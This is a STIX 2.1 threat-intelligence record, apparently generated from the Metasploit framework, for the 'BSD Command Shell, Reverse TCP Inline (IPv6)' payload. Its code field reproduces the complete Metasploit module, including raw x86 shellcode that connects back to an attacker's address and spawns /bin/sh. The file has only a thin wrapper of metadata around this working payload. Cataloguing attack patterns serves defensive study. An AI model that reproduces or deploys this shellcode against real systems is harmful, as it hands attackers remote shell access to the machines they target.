{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8754422a-f0bc-4e89-ba08-26854d6aad2b",
    "created": "2024-08-14T16:33:19.407386Z",
    "modified": "2024-08-14T16:33:19.40739Z",
    "name": "BSD Command Shell, Reverse TCP Inline (IPv6)",
    "description": "Connect back to attacker and spawn a command shell over IPv6",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/bsd/x86/shell_reverse_tcp_ipv6.rb",
            "external_id": "shell_reverse_tcp_ipv6.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 96\n\n  include Msf::Payload::Single\n  include Msf::Payload::Bsd\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'BSD Command Shell, Reverse TCP Inline (IPv6)',\n      'Description'   => 'Connect back to attacker and spawn a command shell over IPv6',\n      'Author'        => [ 'skape', 'vlad902', 'hdm' ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'bsd',\n      'Arch'          => ARCH_X86,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      'Payload'       =>\n        {\n          'Offsets' =>\n            {\n              'LHOST'    => [ 42, 'ADDR6' ],\n              'LPORT'    => [ 36, 'n'    ],\n              'SCOPEID'  => [ 58, 'V'    ]\n            },\n          'Payload' =>\n            \"\\x31\\xc0\\x50\\x40\\x50\\x6a\\x1c\\x6a\\x61\\x58\\x50\\xcd\\x80\\xeb\\x0e\\x59\" +\n            \"\\x6a\\x1c\\x51\\x50\\x97\\x6a\\x62\\x58\\x50\\xcd\\x80\\xeb\\x21\\xe8\\xed\\xff\" +\n            \"\\xff\\xff\\x1c\\x1c\\xbf\\xbf\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +\n            \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x6a\\x02\" +\n            \"\\x59\\xb0\\x5a\\x51\\x57\\x51\\xcd\\x80\\x49\\x79\\xf6\\x50\\x68\\x2f\\x2f\\x73\" +\n            \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x54\\x53\\x53\\xb0\\x3b\\xcd\\x80\"\n        }\n    ))\n    register_options([\n      OptInt.new('SCOPEID', [false, \"IPv6 scope ID, for link-local addresses\", 0])\n    ])\n  end\nend\n",
    "x_mitre_platforms": [
        "bsd'"
    ]
}